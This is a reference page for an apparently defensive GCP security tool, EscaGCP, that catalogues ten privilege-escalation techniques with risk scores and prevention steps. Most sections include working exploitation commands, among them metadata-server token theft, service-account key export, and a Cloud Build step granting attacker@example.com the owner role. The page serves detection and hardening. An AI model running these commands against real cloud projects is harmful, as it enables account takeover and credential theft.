# Attack Techniques Reference

This document details all attack techniques that EscaGCP can detect in your GCP environment.

## Overview

EscaGCP detects privilege escalation and lateral movement techniques specific to Google Cloud Platform. Each technique is assigned a risk score based on:
- **Severity**: How much damage can be done
- **Ease of exploitation**: How simple it is to execute
- **Stealth**: How likely it is to be detected

## Attack Technique Categories

### 🔴 Critical Risk Techniques

#### 1. Service Account Impersonation (`CAN_IMPERSONATE_SA`)
**Risk Score**: 0.9-1.0

**Description**: An attacker can generate access tokens for a service account, effectively becoming that service account.

**Required Permission**: `iam.serviceAccounts.getAccessToken`

**Common Roles**:
- `roles/iam.serviceAccountTokenCreator`
- `roles/iam.serviceAccountAdmin`
- `roles/owner`

**Exploitation**:
```bash
# Generate access token
gcloud auth print-access-token --impersonate-service-account=SA_EMAIL

# Use token with API calls
curl -H "Authorization: Bearer $(gcloud auth print-access-token --impersonate-service-account=SA_EMAIL)" \
  https://cloudresourcemanager.googleapis.com/v1/projects
```

**Prevention**:
- Limit `serviceAccountTokenCreator` role grants
- Use short-lived tokens
- Enable audit logging for token generation
- Implement organizational policy constraints

#### 2. Service Account Key Creation (`CAN_CREATE_SERVICE_ACCOUNT_KEY`)
**Risk Score**: 0.85-0.95

**Description**: Create long-lived service account keys that can be exfiltrated and used indefinitely.

**Required Permission**: `iam.serviceAccountKeys.create`

**Common Roles**:
- `roles/iam.serviceAccountKeyAdmin`
- `roles/iam.serviceAccountAdmin`
- `roles/owner`
- `roles/editor`

**Exploitation**:
```bash
# Create and download key
gcloud iam service-accounts keys create key.json \
  --iam-account=SA_EMAIL

# Use key from anywhere
export GOOGLE_APPLICATION_CREDENTIALS=key.json
gcloud auth list
```

**Prevention**:
- Enforce organizational policy: `constraints/iam.disableServiceAccountKeyCreation`
- Use Workload Identity instead of keys
- Monitor key creation events in audit logs
- Regularly rotate and audit existing keys

### 🟠 High Risk Techniques

#### 3. VM-based Service Account Abuse (`CAN_ACT_AS_VIA_VM`)
**Risk Score**: 0.7-0.85

**Description**: Deploy or modify VMs that run with a privileged service account's permissions.

**Required Permissions**:
- `compute.instances.create` OR `compute.instances.setServiceAccount`
- `iam.serviceAccounts.actAs`

**Common Roles**:
- `roles/compute.admin` + `roles/iam.serviceAccountUser`
- `roles/compute.instanceAdmin` + access to SA

**Exploitation**:
```bash
# Create VM with privileged SA
gcloud compute instances create attacker-vm \
  --service-account=privileged-sa@project.iam.gserviceaccount.com \
  --scopes=cloud-platform

# SSH and use metadata server
gcloud compute ssh attacker-vm
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Prevention**:
- Restrict `compute.admin` role
- Use least-privilege service accounts for VMs
- Enable OS Login
- Disable project-wide SSH keys

#### 4. Cloud Function Deployment (`CAN_DEPLOY_FUNCTION_AS`)
**Risk Score**: 0.75-0.85

**Description**: Deploy cloud functions that execute with a privileged service account.

**Required Permissions**:
- `cloudfunctions.functions.create`
- `iam.serviceAccounts.actAs`

**Common Roles**:
- `roles/cloudfunctions.admin`
- `roles/cloudfunctions.developer` + SA access

**Exploitation**:
```python
# malicious_function.py
import google.auth
import googleapiclient.discovery

def exploit(request):
    credentials, project = google.auth.default()
    service = googleapiclient.discovery.build('cloudresourcemanager', 'v1')
    # Perform privileged actions
    return "Exploited"
```

```bash
# Deploy function
gcloud functions deploy exploit \
  --runtime python39 \
  --trigger-http \
  --service-account=privileged-sa@project.iam.gserviceaccount.com
```

**Prevention**:
- Restrict function deployment permissions
- Use dedicated SAs with minimal permissions
- Enable VPC Service Controls
- Monitor function deployments

#### 5. Cloud Run Deployment (`CAN_DEPLOY_CLOUD_RUN_AS`)
**Risk Score**: 0.75-0.85

**Description**: Deploy Cloud Run services that execute with privileged permissions.

**Required Permissions**:
- `run.services.create`
- `iam.serviceAccounts.actAs`

**Common Roles**:
- `roles/run.admin`
- `roles/run.developer` + SA access

**Exploitation**:
```bash
# Deploy malicious container
gcloud run deploy malicious-service \
  --image=gcr.io/attacker/malicious:latest \
  --service-account=privileged-sa@project.iam.gserviceaccount.com \
  --allow-unauthenticated
```

**Prevention**:
- Restrict Cloud Run admin permissions
- Use Binary Authorization
- Implement least-privilege service accounts
- Monitor container deployments

### 🟡 Medium Risk Techniques

#### 6. Cloud Build Exploitation (`CAN_TRIGGER_BUILD_AS`)
**Risk Score**: 0.6-0.75

**Description**: Trigger builds that run with Cloud Build's default service account (often has Editor role).

**Required Permission**: `cloudbuild.builds.create`

**Common Roles**:
- `roles/cloudbuild.builds.editor`
- `roles/cloudbuild.builds.builder`

**Exploitation**:
```yaml
# cloudbuild.yaml
steps:
- name: 'gcr.io/cloud-builders/gcloud'
  entrypoint: 'bash'
  args:
  - '-c'
  - |
    # Extract SA token
    gcloud auth list
    gcloud projects add-iam-policy-binding $PROJECT_ID \
      --member=user:attacker@example.com \
      --role=roles/owner
```

**Prevention**:
- Use custom service accounts for builds
- Restrict source repository access
- Enable Binary Authorization
- Monitor build logs

#### 7. GKE Workload Identity Abuse (`CAN_DEPLOY_GKE_POD_AS`)
**Risk Score**: 0.65-0.75

**Description**: Deploy pods that can impersonate GKE workload identity service accounts.

**Required Permissions**:
- `container.pods.create`
- Namespace access with WI binding

**Exploitation**:
```yaml
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: production
spec:
  serviceAccountName: workload-identity-sa
  containers:
  - name: attacker
    image: google/cloud-sdk
    command: ["/bin/sh"]
    args: ["-c", "while true; do gcloud auth list; sleep 30; done"]
```

**Prevention**:
- Implement Pod Security Policies/Standards
- Use separate namespaces
- Audit Workload Identity bindings
- Enable Binary Authorization

#### 8. Tag-Based Privilege Escalation (`CAN_MODIFY_TAG`)
**Risk Score**: 0.6-0.7

**Description**: Manipulate resource tags to satisfy IAM conditions and gain elevated privileges.

**Required Permission**: `resourcemanager.tagBindings.create`

**Common Roles**:
- `roles/resourcemanager.tagUser`
- `roles/resourcemanager.tagAdmin`

**Exploitation**:
```bash
# Create tag binding to satisfy condition
gcloud resource-manager tags bindings create \
  --tag-value=tagValues/123456 \
  --parent=//cloudresourcemanager.googleapis.com/projects/PROJECT_ID

# Now conditional IAM binding is satisfied
gcloud projects get-iam-policy PROJECT_ID
```

**Prevention**:
- Restrict tag modification permissions
- Audit IAM conditions using tags
- Use tag holds for critical tags
- Monitor tag binding changes

### 🟢 Lower Risk Techniques

#### 9. SSH Access Combined with Metadata (`CAN_LOGIN_TO_VM`)
**Risk Score**: 0.4-0.6

**Description**: SSH access to VMs can be combined with metadata server access to use attached service accounts.

**Required Permissions**:
- `compute.instances.osLogin` OR
- `iap.tunnelInstances.accessViaIAP` OR
- Project-wide SSH keys

**Exploitation**:
```bash
# SSH to instance
gcloud compute ssh vulnerable-instance

# Inside VM, access metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Prevention**:
- Enable OS Login
- Disable project-wide SSH keys
- Use IAP for SSH access
- Restrict metadata server access

#### 10. Custom Role Manipulation (`CAN_MODIFY_CUSTOM_ROLE`)
**Risk Score**: 0.5-0.65

**Description**: Modify custom roles to add dangerous permissions.

**Required Permission**: `iam.roles.update`

**Common Roles**:
- `roles/iam.roleAdmin`
- `roles/iam.organizationRoleAdmin`

**Exploitation**:
```bash
# Add dangerous permission to custom role
gcloud iam roles update CustomDeveloper \
  --add-permissions=iam.serviceAccounts.getAccessToken \
  --project=PROJECT_ID
```

**Prevention**:
- Limit custom role modification
- Audit custom role changes
- Use predefined roles when possible
- Monitor permission additions

## Attack Chains

EscaGCP also detects multi-step attack chains:

### Example: Complete Project Takeover
```
user:developer@example.com
  ├─[HAS_ROLE]→ roles/cloudfunctions.developer
  ├─[CAN_DEPLOY_FUNCTION_AS]→ function-sa@project.iam
  └─[FUNCTION_SA_HAS]→ roles/editor
    └─[CAN_ADMIN]→ projects/production
```

### Example: Cross-Project Lateral Movement
```
user:contractor@external.com
  ├─[MEMBER_OF]→ group:developers@example.com
  ├─[GROUP_HAS_ROLE]→ roles/compute.admin (project-a)
  ├─[CAN_CREATE_VM_AS]→ vm-sa@project-a.iam
  └─[SA_HAS_ROLE]→ roles/storage.admin (project-b)
```

## Risk Scoring Methodology

Each path is scored based on:

1. **Technique Severity** (40%)
   - Critical: 1.0
   - High: 0.8
   - Medium: 0.6
   - Low: 0.4

2. **Path Length** (20%)
   - Direct (1 hop): 1.0
   - Short (2-3 hops): 0.8
   - Long (4+ hops): 0.6

3. **Target Sensitivity** (30%)
   - Organization: 1.0
   - Folder: 0.8
   - Production Project: 0.7
   - Dev/Test Project: 0.5

4. **Required Effort** (10%)
   - No user interaction: 1.0
   - Requires specific conditions: 0.7
   - Requires physical/console access: 0.4

## Mitigation Strategies

### Organizational Policies
```bash
# Disable service account key creation
gcloud resource-manager org-policies enable-enforce \
  constraints/iam.disableServiceAccountKeyCreation \
  --organization=ORG_ID

# Restrict service account creation
gcloud resource-manager org-policies enable-enforce \
  constraints/iam.disableServiceAccountCreation \
  --organization=ORG_ID

# Require OS Login
gcloud resource-manager org-policies enable-enforce \
  constraints/compute.requireOsLogin \
  --organization=ORG_ID
```

### Monitoring and Alerting
Create alerts for:
- Service account token generation
- Service account key creation
- IAM policy changes
- Custom role modifications
- Compute instance creation with SAs

### Regular Audits
1. Review service account permissions quarterly
2. Audit custom roles monthly
3. Check for unused service accounts
4. Validate conditional IAM bindings
5. Review external user access

## References

- [Google Cloud IAM Best Practices](https://cloud.google.com/iam/docs/best-practices)
- [GCP Security Command Center](https://cloud.google.com/security-command-center)
- [Organizational Policy Constraints](https://cloud.google.com/resource-manager/docs/organization-policy/org-policy-constraints) 